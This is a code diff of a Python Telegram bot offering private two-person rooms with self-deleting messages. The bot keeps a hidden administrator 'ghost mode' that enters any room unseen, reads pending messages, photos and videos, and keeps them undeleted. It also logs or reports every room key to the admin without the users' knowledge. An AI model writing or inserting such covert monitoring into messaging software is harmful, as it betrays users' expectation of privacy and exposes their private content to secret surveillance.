@@ -12,7 +12,6 @@ rooms = {}
 user_to_room = {}
 waiting_for_key = set()
 monitor_active = {}
-# Nueva lista para guardar salas creadas mientras el monitor estaba OFF
 offline_rooms_log = [] 
 
 logging.basicConfig(level=logging.INFO)
@@ -41,27 +40,19 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.chat_id
     text = update.message.text
 
-    # --- BOTÓN MONITOR (ADMIN) ---
+    # --- BOTÓN MONITOR ---
     if text == BTN_MONITOR and user_id == ADMIN_ID:
         asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
-        
-        # Cambiar estado
         is_now_active = not monitor_active.get(user_id, False)
         monitor_active[user_id] = is_now_active
         
-        estado = "ON (Modo Fantasma)" if is_now_active else "OFF (Solo alertas)"
+        estado = "ON (Modo Fantasma)" if is_now_active else "OFF (Modo Usuario)"
         await update.message.reply_text(f"📡 Monitor: {estado}")
 
-        # Si se acaba de activar, mostrar las salas creadas en el "pasado"
-        if is_now_active:
-            if offline_rooms_log:
-                reporte = "📂 **Salas creadas mientras estabas en OFF:**\n\n"
-                reporte += "\n".join([f"• `{r}`" for r in offline_rooms_log])
-                await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
-                offline_rooms_log.clear() # Limpiar log tras informar
-            else:
-                msg = await update.message.reply_text("✅ No hubo salas nuevas mientras estabas OFF.")
-                asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
+        if is_now_active and offline_rooms_log:
+            reporte = "📂 **Salas creadas en OFF:**\n" + "\n".join([f"• `{r}`" for r in offline_rooms_log])
+            await context.bot.send_message(chat_id=ADMIN_ID, text=reporte)
+            offline_rooms_log.clear()
         return
 
     # --- BOTÓN SALIR ---
@@ -82,7 +73,7 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
     if text == BTN_ENTRAR:
         asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
         waiting_for_key.add(user_id)
-        msg = await update.message.reply_text("🔑 Escriba la clave:", reply_markup=ReplyKeyboardRemove())
+        msg = await update.message.reply_text("🔑 Clave:", reply_markup=ReplyKeyboardRemove())
         asyncio.create_task(delete_msg(context, user_id, msg.message_id, 10))
         return
 
@@ -92,37 +83,30 @@ async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
         waiting_for_key.remove(user_id)
         asyncio.create_task(delete_msg(context, user_id, update.message.message_id))
         
-        # Lógica de registro de salas nuevas
         if room_key not in rooms:
             rooms[room_key] = {"members": [], "pending": []}
-            
-            # Si el monitor está OFF, guardar en el log secreto
             if not monitor_active.get(ADMIN_ID, False):
-                if room_key not in offline_rooms_log:
-                    offline_rooms_log.append(room_key)
+                if room_key not in offline_rooms_log: offline_rooms_log.append(room_key)
             else:
-                # Si está ON, avisar al instante
-                await context.bot.send_message(chat_id=ADMIN_ID, text=f"📂 [NUEVA SALA]: `{room_key}`")
+                await context.bot.send_message(chat_id=ADMIN_ID, text=f"📂 [NUEVA]: `{room_key}`")
         
         room = rooms[room_key]
-        is_admin_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
+        is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
 
-        if not is_admin_ghost:
+        if not is_ghost:
             if user_id not in room["members"] and len(room["members"]) >= 2:
                 msg = await update.message.reply_text("🚫 Sala llena.")
                 asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
                 return
-            if user_id not in room["members"]:
-                room["members"].append(user_id)
+            if user_id not in room["members"]: room["members"].append(user_id)
 
         user_to_room[user_id] = room_key
-        txt_status = "👻 Modo Fantasma Activo." if is_admin_ghost else "🔓 Sala activada."
         markup = ReplyKeyboardMarkup([[BTN_SALIR]], resize_keyboard=True, is_persistent=True)
-        await update.message.reply_text(txt_status, reply_markup=markup)
+        await update.message.reply_text("👻 Fantasma" if is_ghost else "🔓 Conectado", reply_markup=markup)
 
         for item in list(room["pending"]):
-            if is_admin_ghost or item["sender"] != user_id:
-                await deliver_content(context, user_id, item, room_key, is_ghost=is_admin_ghost)
+            if is_ghost or item["sender"] != user_id:
+                await deliver_content(context, user_id, item, room_key, is_ghost=is_ghost)
         return
 
     if user_id in user_to_room:
@@ -132,12 +116,12 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.message.chat_id
     room_name = user_to_room[user_id]
     room = rooms[room_name]
-    is_admin_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
+    is_ghost = (user_id == ADMIN_ID and monitor_active.get(ADMIN_ID, False))
     
     asyncio.create_task(delete_msg(context, user_id, update.message.message_id, 2))
     
-    if is_admin_ghost:
-        msg = await update.message.reply_text("⚠️ En modo fantasma solo puedes observar.")
+    if is_ghost:
+        msg = await update.message.reply_text("⚠️ Solo lectura en modo fantasma.")
         asyncio.create_task(delete_msg(context, user_id, msg.message_id, 3))
         return
 
@@ -150,14 +134,11 @@ async def process_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     room["pending"].append(content_item)
 
     if user_id != ADMIN_ID:
-        if monitor_active.get(ADMIN_ID, False):
-            await context.bot.send_message(chat_id=ADMIN_ID, text=f"🕵️ Actividad en sala: `{room_name}`")
-        else:
-            await context.bot.send_message(chat_id=ADMIN_ID, text="🔔 Actividad detectada en el sistema.")
+        msg_alert = f"🕵️ Actividad en: `{room_name}`" if monitor_active.get(ADMIN_ID, False) else "🔔 Actividad en sistema."
+        await context.bot.send_message(chat_id=ADMIN_ID, text=msg_alert)
 
-    others = [m for m in room["members"] if m != user_id]
-    for m_id in others:
-        n_msg = await context.bot.send_message(chat_id=m_id, text="📩 Tienes un mensaje nuevo.")
+    for m_id in [m for m in room["members"] if m != user_id]:
+        n_msg = await context.bot.send_message(chat_id=m_id, text="📩 Nuevo mensaje.")
         asyncio.create_task(delete_msg(context, m_id, n_msg.message_id, 5))
 
 async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
@@ -170,12 +151,16 @@ async def deliver_content(context, chat_id, item, room_name, is_ghost=False):
         elif msg_type == "video":
             sent = await context.bot.send_video(chat_id=chat_id, video=content)
 
-        if not (chat_id == ADMIN_ID and msg_type in ["photo", "video"]):
+        # REGLA DE BORRADO:
+        # Se borra de Telegram SIEMPRE, a menos que seas Admin CON Monitor ON.
+        if not is_ghost:
             asyncio.create_task(delete_msg(context, chat_id, sent.message_id, 10))
-        
-        if not is_ghost and item["sender"] != chat_id:
-            if item in rooms[room_name]["pending"]:
-                rooms[room_name]["pending"].remove(item)
+            
+            # ELIMINACIÓN DE MEMORIA: Solo si NO eres fantasma y no eres el emisor
+            if item["sender"] != chat_id:
+                if item in rooms[room_name]["pending"]:
+                    rooms[room_name]["pending"].remove(item)
+                    
     except: pass
 
 if __name__ == '__main__':
